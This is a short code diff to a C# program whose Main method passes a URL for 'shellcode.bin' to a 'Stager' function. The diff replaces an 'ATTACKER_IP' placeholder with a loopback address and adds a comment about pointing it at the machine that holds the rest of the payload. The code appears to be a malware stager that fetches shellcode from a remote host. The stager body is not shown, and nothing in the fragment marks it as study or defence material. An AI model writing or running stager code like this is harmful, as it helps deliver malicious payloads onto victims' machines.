@@ -23,7 +23,8 @@ public class Program {
 
   public static void Main()
   {
-    string url = "https://ATTACKER_IP/shellcode.bin";
+    // change the IP address to the machine with the rest of the payload
+    string url = "https://127.0.0.1/shellcode.bin";
     Stager(url);
   }
 
